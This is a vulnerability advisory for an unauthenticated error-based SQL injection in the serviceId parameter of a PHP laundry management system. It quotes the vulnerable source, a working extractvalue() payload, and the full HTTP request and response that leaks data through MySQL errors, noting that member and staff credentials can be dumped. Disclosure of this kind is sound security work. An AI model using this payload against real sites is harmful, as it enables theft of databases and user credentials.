## SIMPLE_LAUNDRY_SYSTEM viewdetailforuser.php Error-Based SQL Injection Vulnerability

### I. Vulnerability Impact

The `serviceId` parameter of `viewdetailforuser.php` is concatenated into the service detail query without any validation, and the script prints the raw MySQL error message back to the client. An attacker can therefore wrap any subquery in `extractvalue()` and read its result directly from the HTTP response, which allows the database name, table names, and the credentials stored in the `member` and `staff` tables to be dumped through ordinary browser requests. The page performs no authentication check, so the injection is reachable by any unauthenticated visitor.

### II. Source Code Analysis

The vulnerability resides in `viewdetailforuser.php`, lines 4 and 57-60:

```php
$serviceId = $_GET['serviceId'];
...
$q="SELECT *,firstName,lastName,itemName FROM `regisitem`,`member`,`item` where  `serviceId` = '$serviceId' AND regisitem.memberId = member.memberId AND regisitem.itemId = item.itemId ORDER BY `serviceId`";
$result=$mysqli->query($q);
if(!$result){
    echo "Select failed. Error: ".$mysqli->error ;
    // break;
}
while($row=$result->fetch_array()){
```

`$serviceId` is assigned straight from `$_GET` and inserted between the quotes of `serviceId = '$serviceId'`. There is no `intval()`, no `mysqli_real_escape_string()` and no prepared statement, so a single quote in the parameter closes the literal and the remaining characters are parsed as SQL.

What makes this particular instance far more damaging than a blind injection is line 60: when the query fails, the script echoes `$mysqli->error` into the HTML body. The MySQL error text therefore travels back to the attacker, and any function that raises an error containing the result of an expression — `extractvalue()` and `updatexml()` being the classic choices — turns the endpoint into a direct data extraction channel. Because the error branch does not `break` or `exit`, execution falls through to line 63 and `$result->fetch_array()` raises a fatal error on the boolean `false`, which is visible in the response as well.

The file contains `session_start()` but never checks `$_SESSION`, so no login is required to reach the query.

### III. Payload

The core injection payload is:

```
1'and/**/extractvalue(1,concat(char(126),md5(1300759647)))and'
```

The resulting SQL statement executed by the server becomes:

```sql
SELECT *,firstName,lastName,itemName FROM `regisitem`,`member`,`item` where  `serviceId` = '1'and/**/extractvalue(1,concat(char(126),md5(1300759647)))and'' AND regisitem.memberId = member.memberId AND regisitem.itemId = item.itemId ORDER BY `serviceId`
```

The leading `1'` closes the `serviceId` literal, `/**/` is used as a whitespace substitute so the payload survives URL handling, `extractvalue()` is given a deliberately malformed XPath built from `char(126)` (`~`) concatenated with the value to be extracted, and the trailing `and'` re-balances the quote that the PHP template appends. MySQL evaluates the argument first, then rejects the XPath and reports it inside the error message, so the evaluated value — here the MD5 of `1300759647` — appears in the response.

```
GET /viewdetailforuser.php?serviceId=1'and/**/extractvalue(1,concat(char(126),md5(1300759647)))and' HTTP/1.1
Host: bbn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/trackservice.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive
```

The response echoes the evaluated expression inside the MySQL error message, which proves that the injected SQL was executed and that arbitrary query results can be read from the page:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 08:55:12 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=7k8v11goo7h1ptljjor377q8ai; path=/

<!DOCTYPE html>
<html>
<head>
<title>Database project</title>
...
<tr>
<th>Service ID</th>
<th>Staff ID</th>
<th>Member Id</th>
<th>Member Name</th>
<th>Item Name</th>
<th>Quantity</th>
</tr>
Select failed. Error: XPATH syntax error: '~385ada9f94e8506b187b99ad06d7170'<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_array() on bool in E:\phpstudy_pro\WWW\bbn\viewdetailforuser.php:63
Stack trace:
#0 {main}
thrown in <b>E:\phpstudy_pro\WWW\bbn\viewdetailforuser.php</b> on line <b>63</b><br />
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030165607741](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030165607741.png)
